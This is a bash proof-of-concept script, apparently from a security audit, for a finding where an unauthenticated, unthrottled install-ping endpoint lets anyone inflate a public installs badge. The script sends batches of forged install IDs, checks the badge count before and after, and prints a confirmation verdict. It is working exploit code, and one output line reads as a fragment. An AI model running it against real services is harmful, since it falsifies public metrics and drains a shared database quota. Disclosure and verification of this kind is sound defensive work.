#!/usr/bin/env bash
# PoC for p10-015: POST /api/install-ping allows unthrottled anonymous row inflation
# that poisons the public installs badge.
#
# The route requires no auth, no token, no Turnstile:
#   - dispatch goes straight to handleInstallPing with no limiter call
#     (worker.ts:217 -> handlers/license.ts:752)
#   - InstallPingBodySchema only enforces minLength(1) on install_id; version/platform/
#     backend have no maxLength (license.ts:754-761)
#   - each unique install_id becomes one durable row in install_stats via
#     INSERT OR IGNORE (license.ts:779-786)
#   - GET /api/badge/installs publishes COUNT(DISTINCT install_id) from that table
#     with a public 60 s cache (worker.ts:87-121)
#
# Demonstrated effect: N unauthenticated requests with fresh random UUIDs inflate the
# publicly-served installs badge by exactly N, and each request also consumes a
# rows-written unit of the shared Free-plan D1 quota. A second loop re-using one id is
# ignored (INSERT OR IGNORE), proving uniqueness of attacker-chosen ids is the only gate.
#
# Target: {{BASE_URL}} (filled at confirm time; defaults to local wrangler dev)
set -u
BASE="${1:-}"
case "$BASE" in ''|*'{{'*) BASE="http://127.0.0.1:8915";; esac

badge() { curl -s "$BASE/api/badge/installs" | grep -o '"message":"[^"]*"' | cut -d'"' -f4; }

before=$(badge)
echo "[*] Badge before attack: $before"

# --- Step 1: N anonymous pings with fresh random install ids ---------------------------
N=25
ok=0
for i in $(seq 1 $N); do
  code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/api/install-ping" \
    -X POST -H 'content-type: application/json' \
    -d "{\"install_id\":\"$(uuidgen 2>/dev/null || python3 -c 'import uuid;print(uuid.uuid4())')\",\"version\":\"9.9.9-fake\",\"platform\":\"poc\"}")
  [ "$code" = "200" ] && ok=$((ok+1))
done
echo "[*] Sent $N unique-id pings: HTTP 200 x$ok (no auth header ever sent)"

# --- Step 2: replaying one id does NOT double-count (INSERT OR IGNORE) -----------------
dup=0
for i in $(seq 1 5); do
  curl -s -o /dev/null "$BASE/api/install-ping" -X POST \
    -H 'content-type: application/json' -d '{"install_id":"poc-dup-fixed-id"}'
done
curl -s -o /dev/null "$BASE/api/install-ping" -X POST \
  -H 'content-type: application/json' -d '{"install_id":"poc-dup-fixed-id"}'

after=$(badge)
echo "[*] Badge after attack:  $after"

delta=$(python3 -c "
import sys
b,a=sys.argv[1],sys.argv[2]
def num(s):
    try: return int(s.replace(',',''))
    except: return None
print((num(a)-num(b)) if num(a) is not None and num(b) is not None else 'unknown')" "$before" "$after")

echo ""
echo "=== Result ==="
echo "public installs badge inflated by exactly $delta after $ok unauthenticated requests"
echo "(delta = $N fresh ids + 1 first insert of the replayed id; replays 2-6 were ignored)"
echo "the sole write gate; every unique id costs one D1 rows-written unit forever."

if [ "$ok" -ge 1 ] && [ "$delta" = "$((N+1))" ]; then
  echo '{"status": "confirmed", "evidence": "'"public installs badge inflated by $delta (=$N fake installs) via $ok unauthenticated POST /api/install-ping requests"'", "notes": "no rate limiter, no auth, no maxLength caps; each unique install_id writes one shared-D1 row and inflates COUNT(DISTINCT install_id) served at /api/badge/installs"}'
else
  echo '{"status": "failed", "evidence": "'"ok=$ok before=$before after=$after delta=$delta"'", "notes": ""}'
fi
